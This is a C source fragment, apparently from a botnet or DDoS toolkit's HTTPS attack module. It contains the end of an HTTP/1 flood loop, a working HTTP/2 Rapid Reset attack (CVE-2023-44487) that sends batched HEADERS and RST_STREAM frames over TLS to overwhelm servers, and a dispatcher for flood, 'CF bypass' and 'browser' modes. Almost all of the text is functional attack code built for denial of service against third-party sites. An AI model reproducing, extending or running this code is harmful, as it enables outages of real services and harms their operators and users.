        gettimeofday(&now, NULL);
        if (now.tv_sec - last_cleanup.tv_sec >= 1) {
            for (int i = 0; i < cfg->max_conns; i++) {
                if (conns[i].fd <= 0) continue;
                if (time(NULL) - conns[i].created > HTTPS_CONN_TIMEOUT)
                    tls_conn_close(&conns[i]);
            }
            last_cleanup = now;
        }
    }

    DEBUG_PRINT("https_http1_flood: attack loop ended, cleaning up connections");
    for (int i = 0; i < cfg->max_conns; i++) {
        if (conns[i].fd > 0) tls_conn_close(&conns[i]);
    }

    free(request);
    free(poll_map);
    free(pfds);
    DEBUG_PRINT("https_http1_flood: cleanup complete");
    free(conns);
}

/* ── Mode: rapidreset (CVE-2023-44487) ───────────────────── */

#define H2_MAX_STREAMS_PER_CONN  12499  /* ~0x30D3, matches Chrome behavior */

static void https_rapidreset(attack_params *params, https_config *cfg) {
    DEBUG_PRINT("https_rapidreset: entry host=%s path=%s", cfg->host, cfg->path);
    struct sockaddr_in target;
    memcpy(&target, &params->target_addr, sizeof(target));

    pps_tracker_t rate_tracker;
    pps_tracker_init(&rate_tracker, cfg->rate_limit);
    uint32_t consecutive_failures = 0;

    time_t end_time = time(NULL) + params->duration;

    /* Pre-build initial frames */
    uint8_t init_buf[256];
    int init_len = 0;

    /* Connection preface */
    memcpy(init_buf, H2_PREFACE, H2_PREFACE_LEN);
    init_len += H2_PREFACE_LEN;

    /* SETTINGS */
    init_len += h2_build_settings(init_buf + init_len);

    /* WINDOW_UPDATE on connection (stream 0) */
    init_len += h2_build_window_update(init_buf + init_len, 0, 15663105);

    /* Frame buffer for HEADERS+RST batches */
    uint8_t frame_buf[8192];

    while (params->active && time(NULL) < end_time) {
        /* Connect */
        /* Connection backoff on repeated failures */
        if (consecutive_failures > 5) {
            uint32_t backoff_us = consecutive_failures * 10000;
            if (backoff_us > 500000) backoff_us = 500000;
            usleep(backoff_us);
        }

        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) { consecutive_failures++; usleep(10000); continue; }

        { int one = 1; setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)); }
        http_set_nonblocking(fd);
        int ret = connect(fd, (struct sockaddr *)&target, sizeof(target));
        if (ret < 0 && errno != EINPROGRESS) { close(fd); consecutive_failures++; continue; }

        /* Wait for connect */
        struct pollfd pfd = { .fd = fd, .events = POLLOUT };
        if (poll(&pfd, 1, 300) <= 0) { close(fd); consecutive_failures++; continue; }
        if (pfd.revents & (POLLERR | POLLHUP)) { close(fd); consecutive_failures++; continue; }

        int error = 0;
        socklen_t elen = sizeof(error);
        getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &elen);
        if (error != 0) { close(fd); consecutive_failures++; continue; }

        /* TLS handshake with ALPN h2 */
        https_conn_t *conn = (https_conn_t *)calloc(1, sizeof(https_conn_t));
        DEBUG_PRINT("https_rapidreset: new connection fd=%d", fd);
        if (!conn) { close(fd); consecutive_failures++; continue; }
        conn->fd = fd;
        tls_conn_init(conn, cfg->host, "h2");
        DEBUG_PRINT("https_rapidreset: starting TLS handshake with h2 ALPN");

        int ready = 0;
        for (int attempt = 0; attempt < 200; attempt++) {
            int r = tls_drive(conn);
            if (r < 0) break;
            if (r == 1) { ready = 1; break; }
            usleep(5000);
        }
        if (!ready) { tls_conn_close(conn); free(conn); consecutive_failures++; continue; }
        DEBUG_PRINT("https_rapidreset: handshake %s after attempts", ready ? "succeeded" : "FAILED");

        /* Verify server accepted HTTP/2 via ALPN */
        const char *alpn = br_ssl_engine_get_selected_protocol(&conn->sc.eng);
        if (!alpn || strcmp(alpn, "h2") != 0) {
            DEBUG_PRINT("https_rapidreset: server rejected h2 ALPN (got %s), skipping", alpn ? alpn : "(none)");
            tls_conn_close(conn); free(conn); consecutive_failures++; continue;
        }

        consecutive_failures = 0; /* connection succeeded */

        /* Send H2 preface + settings + window update */
        if (tls_write(conn, init_buf, init_len) < 0) {
            DEBUG_PRINT("https_rapidreset: H2 preface send failed");
            tls_conn_close(conn); free(conn);
            continue;
        }

        /* Rapid reset loop: send HEADERS then RST for each stream */
        uint32_t stream_id = 1;
        int goaway = 0;

        DEBUG_PRINT("https_rapidreset: entering rapid reset loop");
        while (params->active && time(NULL) < end_time && !goaway) {
            int foff = 0;

            /* Rate limiting per batch */
            if (cfg->rate_limit > 0 && !pps_should_send(&rate_tracker, 32)) {
                long sleep_us = pps_sleep_us(&rate_tracker);
                if (sleep_us > 0) usleep(sleep_us);
                continue;
            }

            /* Batch: send multiple HEADERS+RST pairs */
            for (int batch = 0; batch < 32 && foff < (int)sizeof(frame_buf) - 600; batch++) {
                int hlen = h2_build_headers_frame(frame_buf + foff, stream_id,
                    cfg->method_str, cfg->path, cfg->host);
                if (hlen < 0) break; /* HPACK overflow, skip */
                foff += hlen;
                foff += h2_build_rst_stream(frame_buf + foff, stream_id);
                stream_id += 2;

                if (stream_id > (uint32_t)(H2_MAX_STREAMS_PER_CONN * 2 + 1)) {
                    goaway = 1;
                    break;
                }
            }

            if (foff > 0) {
                int w = tls_write(conn, frame_buf, foff);
                if (w < 0) break;
            }

            /* Drain responses (detect GOAWAY) */
            tls_drain(conn);

            unsigned state = br_ssl_engine_current_state(&conn->sc.eng);
            if (state & BR_SSL_CLOSED) break;
        }

        DEBUG_PRINT("https_rapidreset: closing connection, last stream_id=%u", stream_id);
        tls_conn_close(conn); free(conn);
    }
}

/* ── Main entry point ────────────────────────────────────── */

void *https_method(void *arg) {
    attack_params *params = (attack_params *)arg;
    if (!params) return NULL;

    char _tgt[INET_ADDRSTRLEN]; inet_ntop(AF_INET, &params->target_addr.sin_addr, _tgt, sizeof(_tgt)); DEBUG_PRINT("https_method: entry params=%p target=%s duration=%u", (void*)params, _tgt, params->duration);
    attack_rand_init();

    https_config cfg;
    parse_https_config(params, &cfg);
    DEBUG_PRINT("https_method: parsed config mode=%u host=%s path=%s max_conns=%u method=%s", cfg.mode, cfg.host, cfg.path, cfg.max_conns, cfg.method_str);

    switch (cfg.mode) {
    case MODE_HTTPS_FLOOD:
    case MODE_HTTPS_CFBYPASS:
    case MODE_HTTPS_BROWSER:
        DEBUG_PRINT("https_method: calling https_http1_flood mode=%u", cfg.mode);
        https_http1_flood(params, &cfg);
        break;
    case MODE_HTTPS_RAPIDRESET:
        DEBUG_PRINT("https_method: calling https_rapidreset mode=%u", cfg.mode);
        https_rapidreset(params, &cfg);
        break;
    default:
        https_http1_flood(params, &cfg);
        break;
    }
    DEBUG_PRINT("https_method: returning");


    return NULL;
}